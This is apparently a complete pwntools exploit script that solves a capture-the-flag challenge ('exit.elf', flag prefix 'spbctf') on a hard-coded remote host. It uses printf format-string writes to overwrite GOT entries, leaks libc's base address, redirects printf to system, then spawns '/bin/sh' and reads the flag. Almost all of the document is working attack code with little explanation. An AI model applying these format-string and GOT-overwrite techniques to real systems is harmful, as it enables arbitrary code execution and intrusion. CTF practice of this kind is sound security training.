#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import re

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./exit.elf')

if exe.bits == 32:
    lindbg = "/root/linux_server"
else:
    lindbg = "/root/linux_server64"


# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '109.233.56.90'
port = int(args.PORT or 11640)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.EDB:
        return process(['edb', '--run', exe.path] + argv, *a, **kw)
    elif args.QIRA:
        return process(['qira', exe.path] + argv, *a, **kw)
    elif args.IDA:
        return process([lindbg], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX disabled
# PIE:      No PIE (0x400000)
# RWX:      Has RWX segments

io = start()

libc = ELF("libc.so.6_1ec728d58f7fc0d302119e9bb53050f8")
# libc = ELF("../my_libc.so")

exit_got_addr = exe.got["exit"]
printf_got_addr = exe.got["printf"]
main_addr = 0x401172


# step 1: cycle the programm
pl = flat({
        0: f"%{0x40}x%10$hn%{0x1172 - 0x40}x%11$hn",
        0x20: [exit_got_addr+2, exit_got_addr]
    })

io.sendline(pl)
io.recv()

# step 2: leak libc
pl = flat({
    0: "%10$s",
    0x20: p64(printf_got_addr)
    })

io.sendline(pl)

printf_leaked_addr = u64(io.recvuntil(b"\x7f")[-6:]+b"\x00\x00")
LIBC_base = printf_leaked_addr - libc.sym["printf"] 
libc.address = LIBC_base
log.info(f"LIBC_base: {hex(LIBC_base)}")

io.recv()

# step 3: rewrite printf got to system and send "/bin/sh"
system_addr = hex(libc.sym["system"])[2:]
log.info(f"Onegadget: {system_addr}")

sa1 = int(system_addr[:4], 16)
sa2 = int(system_addr[4:8], 16)
sa3 = int(system_addr[8:], 16)
# log.info(f"Sa1: {hex(sa1)}")
# log.info(f"Sa2: {hex(sa2)}")
# log.info(f"Sa3: {hex(sa3)}")

if sa1 <= sa2 and sa2 <= sa3:
    pl = flat({
            0: f"%{sa1}x%11$hn%{sa2-sa1}x%12$hn%{sa3-sa2}x%13$hn",
            0x28: [printf_got_addr+4, printf_got_addr+2, printf_got_addr]
        })
elif sa1 <= sa2 and sa1 >= sa3:
    pl = flat({
            0: f"%{sa3}x%11$hn%{sa1-sa3}x%12$hn%{sa2-sa1}x%13$hn",
            0x28: [printf_got_addr, printf_got_addr+4, printf_got_addr+2]
        })
elif sa1 >= sa2 and sa2 >= sa3:
    pl = flat({
            0: f"%{sa3}x%11$hn%{sa2-sa3}x%12$hn%{sa1-sa2}x%13$hn",
            0x28: [printf_got_addr, printf_got_addr+2, printf_got_addr+4]
        })
else:
    io.close()
    log.warn("Try again, i'm lazy!")
    exit()

io.sendline(pl)
io.sendline("/bin/sh")
io.sendline("cat flag")


io.recvuntil("spbctf")
flag = io.recvuntil("}").decode()
log.success(f"Flag: spbctf{flag}")

io.close()

